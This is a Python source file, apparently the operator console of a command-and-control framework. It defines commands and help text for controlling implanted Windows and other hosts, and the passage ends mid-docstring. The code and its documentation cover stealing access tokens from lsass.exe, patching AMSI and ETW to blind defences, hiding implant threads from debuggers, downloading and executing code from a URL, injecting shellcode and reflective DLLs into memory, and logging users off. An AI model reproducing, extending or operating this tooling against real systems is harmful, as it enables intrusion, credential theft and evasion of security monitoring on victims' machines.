#!/usr/bin/python3
# Copyright (C) 2020 - 2023 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from shlex import split
from base64 import b64encode
from os.path import basename
from string import whitespace
from datetime import datetime
from include.cli.helpers import is_valid_name, make_menu
from include.cli.const import EMPTY, MENU_BOLTS, HELP_DATA, HELP_PIPE, HELP_STRVAL
from include.cirrus import (
    Filter,
    ACTIONS_REG,
    ACTIONS_WTS,
    ACTIONS_TROLL,
    ACTIONS_WINDOW,
    ACTIONS_FUNCMAP,
)
from include.util import (
    nes,
    do_ask,
    is_true,
    time_str,
    bytes_from_src,
    split_user_domain,
)
from include.cli.parser import (
    PARSERS,
    PARSER_RM,
    PARSER_WTS,
    PARSER_ASM,
    PARSER_DEX,
    PARSER_DLL,
    PARSER_RUN,
    PARSER_PULL,
    PARSER_POWER,
    PARSER_CREDS,
    PARSER_RUNAS,
    PARSER_PROXY,
    PARSER_CHECK,
    PARSER_SPAWN,
    PARSER_PARENT,
    PARSER_ZOMBIE,
    PARSER_NETCAT,
    PARSER_REGEDIT,
    PARSER_FUNCMAP,
    PARSER_WORKHOURS,
)

_MENU = [
    "asm",
    "back",
    "cat",
    "cd",
    "chan",
    "check_debug",
    "check_dll",
    "cp",
    "creds",
    "dex",
    "dll",
    "download",
    "elevate",
    "evade",
    "exit",
    "funcmap",
    "getsystem",
    "help",
    "hup",
    "info",
    "jitter",
    "job",
    "jobs",
    "kill",
    "killdate",
    "last",
    "loginas",
    "ls",
    "main",
    "make_token",
    "migrate",
    "mktoken",
    "mounts",
    "mv",
    "nc",
    "parent",
    "parent_clear",
    "parent_desktop",
    "parent_elevated",
    "parent_exclude",
    "parent_fallback",
    "parent_include",
    "parent_name",
    "parent_pid",
    "patch_dll",
    "poweroff",
    "procdump",
    "procname",
    "profile",
    "proxy",
    "ps",
    "pull",
    "pwd",
    "pwsh",
    "reboot",
    "refresh",
    "regedit",
    "rev2self",
    "rm",
    "run",
    "runas",
    "screenshot",
    "script",
    "set_hide",
    "shell",
    "shutdown",
    "show_window",
    "sleep",
    "spawn",
    "steal",
    "touch",
    "troll",
    "untrust",
    "upload",
    "wallpaper",
    "whoami",
    "window",
    "workhours",
    "write",
    "wts",
    "zombie",
]
_TOGGLES = ["enable", "disable"]
_AUTO_TYPES = ["asm", "dll", "zombie"]
_EVADE_TYPES = [
    "eh",
    "erase_header",
    "hide_threads",
    "ht",
    "pa",
    "patch_amsi",
    "patch_etw",
    "pe",
    "zeroamsi",
    "zerothreads",
    "zerotrace",
]


def _is_help(a):
    if a is None:
        return False
    return (
        len(a) == 2 and (a[0] == "-" or a[0] == "/") and (a[1] == "h" or a[1] == "?")
    ) or (len(a) == 1 and (a[0] == "-h" or a[0] == "/?" or a[0] == "?"))


def _split_list(v):
    if not nes(v):
        return None
    e = split(v)
    if not isinstance(e, list) or len(e) == 0:
        del e
        return None
    if len(e) == 1 and "," not in e[0]:
        del e
        return [v.strip()]
    r = list()
    for s in e:
        if "," not in s:
            r.append(s.strip())
            continue
        for n in s.split(","):
            i = n.strip()
            if len(i) == 0:
                continue
            if i[0] == ",":
                i = i[1:].strip()
            if i[-1] == ",":
                i = i[:-1].strip()
            r.append(i)
    del e
    return list(set(r))


def _quick_filter(v):
    f = Filter()
    try:
        f.pid = int(v)
        return f
    except ValueError:
        pass
    f.include = _split_list(v)
    return f


def _split_list_values(e):
    if e is None:
        return None
    if isinstance(e, str):
        if len(e) == 0:
            return None
        return _split_list(e)
    if not isinstance(e, list) or len(e) == 0:
        return None
    if len(e) == 1:
        return _split_list(e[0])
    r = list()
    for v in e:
        o = _split_list(v)
        if o is None or len(o) == 0:
            continue
        r.extend(o)
        del o
    return list(set(r))


def _get_callable(type, show, r, asm, dll):
    if not nes(r.method):
        if not nes(r.data):
            if nes(asm) or (nes(dll) and r.reflect):
                p = {"show": show}
                if nes(asm):
                    b, _ = bytes_from_src(asm, raw=False, empty=False)
                    p["data"] = b64encode(b).decode("UTF-8")
                    del b
                    print(f'[+] Using runtime ASM file "{asm}".')
                else:
                    b, _ = bytes_from_src(dll, raw=False, empty=False)
                    p["data"] = b64encode(b).decode("UTF-8")
                    del b
                    print(f'[+] Using runtime DLL file "{dll}".')
                if nes(r.entry):
                    p["entry"] = r.entry
                if nes(r.args):
                    p["fake"] = r.args
                    print('[+] Guessing method "zombie" based on arguments.')
                    return "zombie", p
                print('[+] Guessing method "asm" based on arguments.')
                return "asm", p
            if nes(dll):
                p = {"show": show, "reflect": r.reflect}
                b, v = bytes_from_src(dll, raw=False, empty=False)
                if v:
                    p["path"] = b
                else:
                    p["data"] = b64encode(b).decode("UTF-8")
                del b, v
                if nes(r.entry):
                    p["entry"] = r.entry
                del r
                print(f'[+] Using runtime DLL file "{dll}".')
                print('[+] Guessing method "dll" based on arguments.')
                return "dll", p
            print('[+] Guessing method "self" based on arguments.')
            return "", None
        if r.data.lower() == "self":
            print('[+] Guessing method "self" based on arguments.')
            return "", None
        if r.data.lower().startswith("http") and "://" in r.data:
            print('[+] Guessing method "pexec" based on arguments.')
            if nes(r.agent):
                return "pexec", {"url": r.data, "agent": r.agent}
            return "pexec", r.data
        p = {"cmd": r.data, "show": show}
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            if nes(u):
                p["user"] = u
            if nes(r.pw):
                p["pass"] = r.pw
            if nes(d):
                p["domain"] = d
            del u, d
        b, x = bytes_from_src(r.data, path=True, b64=False, no_err=True)
        if not x and b is not None:
            p = {"show": show, "data": b64encode(b).decode("UTF-8")}
            if nes(r.entry):
                p["entry"] = r.entry
            if nes(r.args):
                p["fake"] = r.args
                print('[+] Guessing method "zombie" based on arguments.')
                return "zombie", p
            print('[+] Guessing method "asm" based on arguments.')
            return "asm", p
        del b, x
        print('[+] Guessing method "exec" based on arguments.')
        return "exec", p
    m = r.method.lower()
    if m == "self":
        return "", None
    if not nes(r.data) and (nes(asm) or nes(dll)) and m not in _AUTO_TYPES:
        raise ValueError(f"{type}: missing file/command!")
    elif not nes(r.data) and not nes(asm) and not nes(dll):
        raise ValueError(f"{type}: missing file/command!")
    if m == "url":
        if nes(r.agent):
            return "pexec", {"url": r.data, "agent": r.agent}
        return "pexec", r.data
    if m == "zombie" and not nes(r.args):
        raise ValueError(f"{type}: missing fake arguments for Zombie process!")
    if m == "exec" or m == "exe":
        p = {"cmd": r.data, "show": show}
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            if nes(u):
                p["user"] = u
            if nes(r.pw):
                p["pass"] = r.pw
            if nes(d):
                p["domain"] = d
            del u, d
        return "exec", p
    if m == "dll" and not nes(r.data) and r.reflect and nes(asm):
        m = "asm"
    if m == "dll":
        if not nes(r.data) and nes(dll):
            r.data = dll
            print(f'[+] Using runtime DLL file "{dll}".')
        p = {"show": show, "reflect": r.reflect}
        b, v = bytes_from_src(r.data, cb64=True, ext=True, explicit=True, empty=False)
        if v:
            p["path"] = b
        else:
            p["data"] = b64encode(b).decode("UTF-8")
        del b, v
        if nes(r.entry):
            p["entry"] = r.entry
        del r
        return "dll", p
    if m == "asm" or m == "zombie":
        p = {"show": show}
        if not nes(r.data) and nes(asm):
            r.data = asm
            print(f'[+] Using runtime ASM file "{asm}".')
        if not nes(r.data) and nes(dll):
            r.data = dll
            print(f'[+] Using runtime DLL file "{dll}".')
        b, _ = bytes_from_src(r.data, cb64=True, explicit=False, empty=False)
        p["data"] = b64encode(b).decode("UTF-8")
        del b
        if nes(r.entry):
            p["entry"] = r.entry
        if m == "zombie":
            p["fake"] = r.args
        del r
        return m, p
    raise ValueError(f"{type}: invalid/unguessable method!")


class MenuBolt(object):
    __slots__ = (
        "id",
        "jobs",
        "show",
        "shell",
        "_user",
        "filter",
        "_domain",
        "__dict__",  # Added as we dynamically override functions for Script
        "_password",
    )

    def __init__(self, shell):
        self.id = None
        self._user = ""
        self.jobs = None
        self.show = False
        self._domain = ""
        self.filter = None
        self.shell = shell
        self._password = ""

    def do_ls(self, p):
        """
        ls [remote_path]

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on path)

        Retrieves a list of files in the supplied directory path. If no path is
        given, the client will use the current working directory.

        Environment variables are processed on the client.

        Examples:
            ls
            ls C:/
        """
        if len(p) == 0:
            return self._system("ls")
        if p == "-al":
            return self._system("ls")
        if p.startswith("-") and " " in p:
            p = p[p.find(" ") + 1 :]  # Truncate any "ls -al"
        self._system(f"ls {p}")

    def do_cd(self, p):
        """
        cd <remote_path>

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on path)

        Instructs the client to change it's current working directory.

        Environment variables are processed on the client.

        Examples:
            cd C:/
            cd C:/Windows
        """
        if len(p) == 0:
            return print("cd <remote_path>")
        self._system(f"cd {p}")

    def do_ps(self, _):
        """
        ps

        OS:    Any
        OPsec: Safe
        Admin: No

        Retrieves a list of running processes on the client.
        """
        self._system("ps")

    def do_nc(self, *a):
        """
        nc [-T|--tcp]
        |  [-U|--udp]
        |  [-I|--icmp]
        |  [-S|--tls]
        |  [-X|--tls-insecure]
        |  [-r|--read]
        |  [-t|--timeout]     <seconds
        |  [-o|--output]      <local_path>
        |  <host:port>
        |  [data]

        OS:    Any
        OPsec: Safe-ish (depends on network logging)
        Admin: No (only needed for raw cons)

        Make a connection from the client device using tcp,udp,icmp,tls or
        insecure (no CA check) tls. This function assumes tcp by default if
        nothing is specified.

        When making the connection a data payload may be specified to be sent.
        This can include local files or raw data. By default, this will only SEND
        the data and will ONLY RECEIVE if the "-r" or "--read" switch is used.

        Data passed to this command will be evaluated for Data Specification
        Identifiers, but will default to text.

        See "help data" for more info on Data Specification Identifiers.

        When reading it will read until socket closure, unless a timeout specified
        with "-t" was specified (in seconds).

        The results of the data will be returned back to the console output. The
        flag "-o" allows for a local file for the output to be written to instead.

        Examples:
            nc --tcp 1.1.1.1:53 b$Hello There!
            nc -r 127.0.0.1:8080 b$GET /secret.txt HTTP/1.1\\nHost: 127.0.0.1\\n\\n
        """
        if _is_help(a):
            return self.do_help("nc")
        if len(a) == 0:
            return print("nc <host:port> [data]")
        r = PARSERS[PARSER_NETCAT].parse_args(a, cat=" ")
        if not nes(r.host):
            return print("nc <host:port> [data]")
        p = "tcp"
        if r.tcp:
            p = "tcp"
        elif r.udp:
            p = "udp"
        elif r.icmp:
            p = "icmp"
        elif r.tls:
            p = "tls"
        elif r.tls_insecure:
            p = "tls-insecure"
        self._exec(
            self.shell.cirrus.task_netcat,
            host=r.host,
            proto=p,
            data=r.data,
            seconds=r.timeout,
            read=r.read,
            dest=r.output,
        )
        del r, p

    def do_rm(self, *a):
        """
        rm [-f|--force] <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Deletes a file at the specified path. The force flag "-f" or "--force"
        may be used to delete recursively or delete non-empty directories.

        Environment variables are processed on the client.

        Examples:
            rm C:/directory
            rm -f C:/my/file/path
        """
        if _is_help(a):
            return self.do_help("rm")
        if len(a) == 0:
            return print("rm <remote_path>")
        r = PARSERS[PARSER_RM].parse_args(a, eq=True)
        if not nes(r.path):
            return print("rm <remote_path>")
        self._exec(self.shell.cirrus.task_delete, path=r.path, force=r.force)
        del r

    def do_job(self, j):
        """
        job <job_id>

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Retrieve the results of a completed Job.

        Examples:
            job 1337
        """
        if len(j) == 0:
            return print("job <job_id>")
        try:
            if self.shell.cirrus.show_result(self.id, int(j), False):
                return
            print(f"[+] Job {j} returned no content.")
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_pwd(self, _):
        """
        pwd

        OS:    Any
        OPsec: Safe
        Admin: No

        Returns the client's current working directory.
        """
        self._system("pwd")

    def do_cat(self, f):
        """
        cat <remote_path>

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on target)

        Display the contents of the file at the specified path.

        Environment variables are processed on the client.

        Examples:
            cat C:/file1.txt
            cat C:/Windows/system.ini
        """
        self.do_download(f, None)

    def do_hup(self, *a):
        """
        hup [-u <user>] [-d <domain>] [-p <password>] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client but detaches immediately and returns
        without retrieving the exit code or stdout/stderr.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The "$" and "." prefixes are allowed for use with this command.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            hup echo lol
            hup ping 127.0.0.1
            hup -u bob -p Password1 whoami /all
        """
        self._run("hup", True, None, *a)

    def do_run(self, *a):
        """
        run [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] <command>

        OS:    Any
        OPsec: Maybe (depends on command)
        Admin: Maybe (depends on command)

        Executes a command on the client and will return the PID, exit code and
        any stdout/stderr data once the process completes.

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        Examples:
            run tasklist
            run ping 127.0.0.1
            run -u bob -p Password1 whoami /all
        """
        self._run("run", False, None, *a)

    def do_asm(self, *a):
        """
        asm [-x|--detach] [-e|--entry <function>] <data>

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Reads the filepath from the local (non-client) filesystem as binary data
        and will run it in memory as assembly.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The owning process of this thread can be controlled by the parent filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        Data passed to this command will be evaluated for Data Specification
        Identifiers, but will default to a local file path.

        See "help data" for more info on Data Specification Identifiers.

        If the file path points to a compiled DLL, this will convert it to
        shellcode on the server side before being sent to the client.

        The "-e" or "--entry" argument can be used to specify the function started
        after DLLMain (if the file is a DLL or DLL bytes).

        Examples:
            asm /home/hackerman/gibson.bin
            asm /tmp/malware.dll
        """
        if _is_help(a):
            return self.do_help("asm")
        if len(a) == 0:
            return print("asm <data>")
        r = PARSERS[PARSER_ASM].parse_args(a, eq=True)
        if not nes(r.data):
            return print("asm <data>")
        self._exec(
            self.shell.cirrus.task_assembly,
            data=r.data,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
            entry=r.entry,
        )
        del r

    def do_dex(self, *a):
        """
        dex [-x|--detach] [-a|--agent <user-agent>] <url>

        OS:    Any (ASM/DLL is Windows only)
        OPsec: Not Safe! (If the target is a Binary/DLL), Disk Write
        Admin: No

        Downloads the file at the supplied URL (as the client) and attempt to
        execute it. The "Content-Type" header determines what action is taken,
        and can take the form of many different types, such as an EXE, PowerShell
        or Assembly for example.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        DLL or Binary files make a write to disk!

        The parent of this executable can be controlled by the parent filter,
        which can be updated with the filter commands. By default the parent will
        be the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The "-a" or "--agent" argument may be specified to change the User-Agent
        the client uses to connect to the server. String-Var Dynamic Values are
        supported. If left empty, the default Firefox agent string will be used.

        See "help strvar" for more info on String-Var Dynamic Values.

        Examples:
            dex google.com/robots.txt
            dex -a 'GoogleBot v%100d' google.com/file.txt
        """
        if _is_help(a):
            return self.do_help("dex")
        if len(a) == 0:
            return print("dex <url>")
        r = PARSERS[PARSER_DEX].parse_args(a, eq=True)
        if not nes(r.url):
            return print("dex <url>")
        self._exec(
            self.shell.cirrus.task_pull_exec,
            url=r.url,
            agent=r.agent,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_jobs(self, _):
        """
        jobs

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Display Jobs in progress or cached completed Jobs.
        """
        self.shell.cirrus.show_jobs(self.id, all=False)

    def do_back(self, _):
        """
        back

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Go back to the Bolts menu.
        """
        self._user = ""
        self._domain = ""
        self._password = ""
        self.shell.set_menu(MENU_BOLTS)

    def do_exit(self, _):
        """
        back

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Go back to the Bolts menu.
        """
        self.do_back(_)

    def do_help(self, n):
        if len(n) == 0 or n == "help":
            return print("help <command>")
        if n == "data":
            return print(HELP_DATA)
        if n == "strval":
            return print(HELP_STRVAL)
        else:
            try:
                d = getattr(self, "do_" + n).__doc__
            except AttributeError:
                return print(f'[!] Help text for "{n}" not found.')
            if d is None:
                return print(f'[!] Help text for "{n}" not found.')
        for i in d.strip().split("\n"):
            print(i.lstrip(whitespace))
        del d

    def do_info(self, _):
        """
        info

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Display system and client information, such as PID, PPID, user and OS
        version.
        """
        self.shell.cirrus.show_info(self.id)

    def do_kill(self, n):
        """
        kill <pid | process_name>

        OS:    Any
        OPsec: Safe (Process logging?)
        Admin: Maybe (depends on target)

        Attempts to force kill a process by it's Process ID (PID) or image name.

        Examples:
            kill 1337
            kill explorer.exe
        """
        if len(n) == 0:
            return print("kill <pid|name>")
        p, v = None, None
        try:
            p = int(n)
        except ValueError:
            v, p = n, None
        self._exec(self.shell.cirrus.task_kill, pid=p, pname=v)
        del p, v

    def default(self, c):
        if self.shell.no_default_run:
            return
        self.do_run(c)

    def do_chan(self, v):
        """
        chan [boolean]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Enable/Disable channel mode. If no option is specified, enable channel
        mode (if not already enabled).

        Can take multiple types of boolean values: ("true", "T", "t", "yes", "y",
        "enable", "e", "1").

        Examples:
            chan
            chan true
            chan disable
        """
        if len(v) == 0:
            return self._system("chan")
        self._system(f"chan {str(is_true(v)).lower()}")

    def do_dll(self, *a):
        """
        dll [-x|--detach] [-r|--reflect] [-e|--entry <function>] <data>

        OS:    Windows
        OPsec: Not Safe! (If a local file is used without reflection), Disk Write
        Admin: Maybe (depends on target)

        Loads a DLL into memory of a process.

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed).

        The behavior of this command is affected by the Data Specification
        Identifiers in the supplied data.

        If no Data Specification Identifier is found or the identifier indicates
        |  any identifier that is NOT external, the raw contents will be loaded
        |  into memory and sent to the client.
        |
        |  If the "-r" or "--reflect" argument is used, the server will convert
        |  the DLL to shellcode and run it on the client as assembly, otherwise
        |  the file will be written to a temp folder on disk and loaded directly.

        If the data contains a Remote File Path Data Specification Identifier,
        |  path will be sent to the client to load the path directly from disk.
        |  NOTE: The "-r" or "--reflect" argument is ignored in this scenario.

        See "help data" for more info on Data Specification Identifiers.

        The "-e" or "--entry" argument can be used to specify the function started
        after DLLMain. This will only occur if the DLL is reflected and will be
        ignored if empty.

        The owning process of this thread can be controlled by the shell filter,
        which can be updated with the filter commands. By default the owner will
        be the current client process if not set.

        Examples:
            dll x$/tmp/implant.dll
            dll -r /tmp/malware.dll
            dll C:/Windows/malware.dll
        """
        if _is_help(a):
            return self.do_help("dll")
        if len(a) == 0:
            return print("dll <data>")
        r = PARSERS[PARSER_DLL].parse_args(a)
        if not nes(r.data):
            return print("dll <data>")
        self._exec(
            self.shell.cirrus.task_dll,
            data=r.data,
            reflect=r.reflect,
            show=self.show,
            detach=r.detach,
            filter=self.filter,
        )
        del r

    def do_last(self, _):
        """
        last

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Display the last time the client connected.
        """
        s, t = self.shell.cirrus.session(self.id), datetime.now()
        print(f'Last: {time_str(t, s["last"], True)}')
        del s, t

    def do_wts(self, *a):
        """
        wts <ls|ps|logoff|dis|disconnect|msg|message>
        |   [session]
        |   [-f|--flags]   <flags>
        |   [-w|--wait]
        |   [-t|--seconds] <seconds>
        |   [title]
        |   [text]

        OS:    Any (ps/actions are Windows only)
        OPsec: Safe
        Admin: Maybe (depends on session target)

        Allows for listing user Logins on any device and advanced functions on Windows
        devices like Disconnect, Logoff and Message.

        The wts command takes an action argument, which determines what parameters
        it will accept.

        The special Session ID "-1" can be used in place of a valid Session ID
        to select the current session the client is in. The values "cur" and
        "current" also have the same effect.

        Currently the following actions are accepted:

        ls
        |  List the current user sessions on the client. This works with any OS.

        ps [session]
        |  (Windows Only) List the processes running under a user login session.
        |  The Session ID is optional and this will return all processes if omitted.

        disconnect, dis [session]
        |  (Windows Only) Disconnect the user session. This will kick off users
        |  if they are using Remote Desktop and will lock consoles otherwise.
        |  This does not kill the user session processes running and they will be
        |  resumed if the user logs back in.

        logoff [session]
        |  (Windows Only) Logoff the user session. Unlike the "disconnect" action,
        |  this will terminate all running user processes when kicking the user out.

        message, msg [session] [-f|--flags <N>] [-w|--wait <N>] [-t|--seconds <N>] [title] [text]
        |  (Windows Only) Display a message similar to the "window message" function.
        |  This will return once the message is displayed, but the "-w" wait
        |  argument may be specified to only return once the user clicks on the
        |  message box. If the "-w" wait argument is specified, this will only
        |  display the message box for the specified number of seconds and then
        |  dissapear. The "-f" flags argument may be used to specify the display
        |  options of the message box. This argument accepts hex values.
        |
        |  The title and text options support using raw or Base64 data using
        |  Data Specification Identifiers. They do not support file paths.
        |
        |  See "help data" for more info on Data Specification Identifiers.

        Examples:
            wts ls
            wts ps 1
            wts ps cur
            wts disconnect 2
            wts logoff 1
            wts message -1 "Hello There" "How are you?"
        """
        if _is_help(a):
            return self.do_help("wts")
        if len(a) == 0:
            return print("wts <cmd> [session]")
        r = PARSERS[PARSER_WTS].parse_args(a, cat=" ", nones=False)
        if not nes(r.cmd):
            return print("wts <cmd> [session]")
        self._exec(
            self.shell.cirrus.task_wts,
            action=r.cmd,
            session=r.session,
            title=r.title,
            text=r.text,
            flags=r.flags,
            seconds=r.seconds,
            wait=r.wait,
        )
        del r

    def do_evade(self, m):
        """
        evade <flag1,flag2,..flagN>

        OS:    Windows (*nix support soon!)
        OPsec: Safe
        Admin: No

        Performs one or more evasion procedures on the client. These procedures
        can be space of comma seperated.

        Currently the following (Windows Only) evasion procedures are supported:

        patch_etw, pe, zerotrace
        |  Patch Etw* functions with Assembly that will prevent any events from
        |  being executed.

        patch_amsi, pa, zeroamsi
        |  Patch Amsi* functions so they return pass values and will not trigger
        |  alerts.

        hide_threads, ht, zerothreads
        |  Hide each currently running client implant thread from any debugger
        |  by using the "HideThreadFromDebugger" flag.

        erase_header, eh
        | Prevent debugging attempts by zero-ing out the PE header and it's
        | structures.

        The special flag name "all" can be used to run all procedures.

        Examples:
            evade all
            evade patch_amsi
        """
        if not nes(m):
            return print("evade <flag1,flag2,..flagN>")
        self._exec(self.shell.cirrus.task_evade, action=m)

    def do_pull(self, *a):
        """
        pull [-a|--agent agent] [-o|--output local_path] [-r|--redirect] <url> [remote_path]

        OS:    Any
        OPsec: Not Safe! Disk Write (If a remote path is used)
        Admin: Maybe (depends on target)

        Downloads the file at the supplied URL (as the client) and save it to
        the specified remote path. If a remote path is not used and the "-r" or
        "--redirect" argument is used, the results will be returned instead. If
        the "-o" argument is used, it will be saved to the supplied local file path.
        Otherwise, the basename of the file will be used instead.

        The "-a" or "--agent" argument may be specified to change the User-Agent
        the client uses to connect to the server. String-Var Dynamic Values are
        supported. If left empty, the default Firefox agent string will be used.

        See "help strvar" for more info on String-Var Dynamic Values.

        Examples:
            pull google.com/robots.txt C:/robots.txt
            pull -a 'Chrome/Webkit %90d.%90d.%10d %12d/%30d' example.com/file.txt file.txt
        """
        if _is_help(a):
            return self.do_help("pull")
        if len(a) < 1:
            return print("pull <url> [remote_path]")
        r = PARSERS[PARSER_PULL].parse_args(a, eq=True)
        if not nes(r.url):
            return print("pull <url> [remote_path]")
        if not r.redirect and not nes(r.file):
            r.file = basename(r.url)
        if r.redirect and nes(r.output):
            return print('[!] Cannot use "-r"/"--redirect" with "-o"/"--output"!')
        self._exec(
            self.shell.cirrus.task_pull,
            url=r.url,
            path=r.file,
            agent=r.agent,
            dest=r.output,
        )

    def do_pwsh(self, *a):
        """
        pwsh [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] [-f|--file] <command>

        OS:    Any
        OPsec: Maybe (depends on command / PowerShell Logging)
        Admin: Maybe (depends on command)

        Executes a command on the client as a PowerShell command will return the
        PID, exit code and any stdout/stderr data once the process completes.

        This handles the location of PowerShell automatically and fails if the
        PowerShell binary cannot be found (both Windows and *nix).

        The parent of this command can be controlled by the parent filter, which
        can be updated with the filter commands. By default the parent will be
        the current client process if not set.

        This command is affected by the "set_hide" command, which by default
        does not show any processes launched.

        The dollar sign "$" can be prefixed to a raw command instead to run as
        a PowerShell command instead of using this function.

        This command is affected by any saved credentials (if no credentials are
        specified manually. See below.)

        If the "-x" or "--detach" argument is specified, the command will be ran
        in "detached" mode and will return instantly and not be monitored. (This
        also allows the process to live even when the client is closed). This is
        the same as running this command with the "hup" command.

        The additional "-u", "-p" and "-d" arguments may be used to change the
        user the process is executed as. See the "runas" command for more info.

        If the "-f" or "--file" argument is specified, the command is evaluated
        to detect any Data Specification Identifiers present and can be a raw string
        value instead of a file. If no identifiers are found, this will default
        to a local file path to be read and will be sent to the shell as input
        to stdin.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            $Write-Host "hello"
            pwsh Get-Host
            pwsh Get-WmiObject -Class Win32_BIOS
            pwsh -u bob@example -p password1 Get-Host
        """
        self._run("pwsh", False, "$", *a)

    def do_sleep(self, v):
        """
        sleep [duration]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the sleep value for the client. The duration string by default is
        in seconds, but can be suffixed with a 'm', 'h' or 's' to indicate
        minutes, hours or seconds, respectively.

        If a forward slash "/" is specified, the jitter value may also be updated
        at the same time. (The percent symbol "%" may be included or omitted.

        If no value is specified, this displays the current sleep value.

        Examples:
            sleep
            sleep 5s
            sleep 2m
            sleep 30s/50
            sleep 15s/20
        """
        if len(v) == 0:
            s = self.shell.cirrus.session(self.id)
            print(f'Sleep is set to: {int(int(s["sleep"])//1000000000)}s')
            del s
            return
        self._system(f"sleep {v}")

    def do_touch(self, p):
        """
        touch <remote_path>

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Creates an empty file at the remote destination, if it does not already
        exist.

        Environment variables are processed on the client.

        Examples:
            touch C:/new-file.txt
        """
        if len(p) == 0:
            return print("touch <remote_path>")
        self._exec(self.shell.cirrus.task_touch, path=p)

    def do_steal(self, v):
        """
        steal [pid | process_name]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Attempt to steal and use a token from the target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the parent commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Alias of "elevate".

        Examples:
            steal
            steal 1337
            steal lsass.exe
            steal winlogon.exe
        """
        self._system_filter("elevate", v)

    def do_proxy(self, *a):
        """
        proxy [-r|--remove] [-u|--update] <name> <address> <profile>

        OS:    Any
        OPsec: Safe (Network logging?)
        Admin: Maybe (depends on port used)

        View, add or remove client-side proxies.

        When not provided with any arguments, this function will return a list
        of any proxies active on the client.

        To remove a currently active Proxy instance, specify the "-r" argument
        with the Proxy name.

        To add a Proxy, supply a name, bind address and a profile to be used.

        To update a Proxy, specify the "-u" argument along with the name and new
        bind address to be used. The profile may be omitted if it does not need
        to be changed.

        Depending on the build arguments of the client, it may only support a
        single Proxy instance or may not support them at all.

        Examples:
            proxy
            proxy test1 0.0.0.0:8080 tcp-profile1
            proxy -u test1 0.0.0.0:9090
            proxy -r test1
        """
        if _is_help(a):
            return self.do_help("proxy")
        if len(a) == 0:
            try:
                r = self.shell.cirrus.session(self.id)
                if "proxy" not in r or len(r["proxy"]) == 0:
                    return print("No proxy services are running.")
                print(f'{"Name":16}Address\n{"="*40}')
                for i in r["proxy"]:
                    print(f'{i["name"]:16}{i["address"]:20}')
                del r
            except ValueError as err:
                print(f"[!] {err}!")
            return
        r = PARSERS[PARSER_PROXY].parse_args(a)
        if not nes(r.name):
            return print("proxy <name> <address> <profile>")
        if not r.remove and not nes(r.bind):
            return print("proxy <name> <address> <profile>")
        if not r.update and not r.remove and not nes(r.profile):
            return print("proxy creation requires a profile")
        if r.remove:
            self._exec(self.shell.cirrus.session_proxy_remove, name=r.name)
        elif r.update:
            self._exec(
                self.shell.cirrus.session_proxy_update,
                name=r.name,
                address=r.bind,
                profile=r.profile,
            )
        else:
            self._exec(
                self.shell.cirrus.session_proxy_add,
                name=r.name,
                address=r.bind,
                profile=r.profile,
            )
        del r

    def do_script(self, n):
        """
        script <name>

        OS:    Depends on Script contents
        OPsec: Depends on Script contents
        Admin: Depends on Script contents

        Runs the script with the supplied name. The resulting output from the
        script is depdent on it's settings.

        Examples:
            script script1
            script script_test
        """
        if not is_valid_name(n, 1, True):
            return print("script <name>")
        self._exec(self.shell.cirrus.task_script, script=n)

    def do_creds(self, *a):
        """
